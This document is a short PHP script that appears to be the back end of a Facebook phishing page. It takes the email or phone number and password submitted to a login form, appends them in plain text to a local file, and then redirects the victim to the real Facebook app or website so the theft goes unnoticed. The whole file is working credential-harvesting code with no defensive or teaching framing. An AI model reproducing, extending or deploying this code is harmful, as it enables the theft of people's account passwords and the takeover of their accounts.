<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $emailOrPhone = $_POST["email_or_phone"];
    $password = $_POST["password"];

    // Validate and sanitize form data (you can add more validation if needed)

    // Save form data to a text file
    $data = "Email or Phone: " . $emailOrPhone . "\nPassword: " . $password . "\n\n";
    $file = fopen("form_data.txt", "a") or die("Unable to open file!");
    fwrite($file, $data);
    fclose($file);

    // Redirect to Facebook app URI scheme for logging in
    $facebookAppUrl = "fb://profile";
    $facebookWebUrl = "https://www.facebook.com";
    
    // Check if the user agent is a mobile device
    if (isset($_SERVER['HTTP_USER_AGENT']) && preg_match('/iphone|android|ipad/i', $_SERVER['HTTP_USER_AGENT'])) {
        // Redirect to Facebook app URI scheme
        header("Location: $facebookAppUrl");
    } else {
        // Redirect to Facebook website
        header("Location: $facebookWebUrl");
    }
    exit();
}
?>
